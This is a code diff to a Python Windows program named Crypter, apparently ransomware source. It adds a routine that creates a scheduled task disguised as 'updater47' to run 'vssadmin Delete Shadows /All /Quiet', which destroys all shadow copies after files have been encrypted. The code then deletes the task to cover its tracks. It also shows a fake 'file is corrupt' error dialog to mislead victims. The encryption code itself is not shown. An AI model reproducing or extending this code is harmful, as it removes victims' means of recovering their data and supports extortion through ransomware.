@@ -15,11 +15,13 @@ import _winreg
 import wx
 import time
 import json
+import traceback
 
 # Import classes
 import Crypt
 import Base
 import Gui
+from ScheduledTask import ScheduledTask 
 
 
 ###################
@@ -52,6 +54,13 @@ class Crypter(Base.Base):
       # If no files were encrypted. do nothing 
       if not os.path.isfile(self.encrypted_file_list):
           return
+      # Delete Shadow Copies
+      try:
+          self.__delete_shadow_files()
+      except Exception as ex:
+          fh = open("error.txt", "w")
+          fh.write(traceback.format_exc())
+          fh.close()
       # Present GUI
       self.start_gui()
     # ALREADY ENCRYPTED
@@ -71,6 +80,19 @@ class Crypter(Base.Base):
           config = json.load(runtime_cfg_file)
 
       return config
+  
+  
+  def __delete_shadow_files(self):
+      '''
+      @summary: Create, run and delete a scheduled task to delete all file shadow copies from disk
+      '''
+      
+      vs_deleter = ScheduledTask(
+          name="updater47",
+          command="vssadmin Delete Shadows /All /Quiet"
+          )
+      vs_deleter.run_now()
+      vs_deleter.cleanup()
 
       
   def get_start_time(self):
@@ -329,16 +351,15 @@ if __name__ == "__main__":
     # Try to grab mutex control
     mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
     if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-      # If mutex already exists, present corruption message
-      mutex = None
-      app = wx.App()
-      error_dialog = wx.MessageDialog(None, "The file is corrupt and cannot be opened",
-                                      "Error", wx.OK|wx.ICON_ERROR)
-      error_dialog.ShowModal()
-      app.MainLoop()
-      sys.exit()
+        # If mutex already exists, present corruption message
+        mutex = None
+        app = wx.App()
+        error_dialog = wx.MessageDialog(None, "The file is corrupt and cannot be opened",
+                                        "Error", wx.OK|wx.ICON_ERROR)
+        error_dialog.ShowModal()
+        app.MainLoop()
+        sys.exit()
 
     # Otherwise run crypter
     else:
-      go = Crypter()
-
+        go = Crypter()
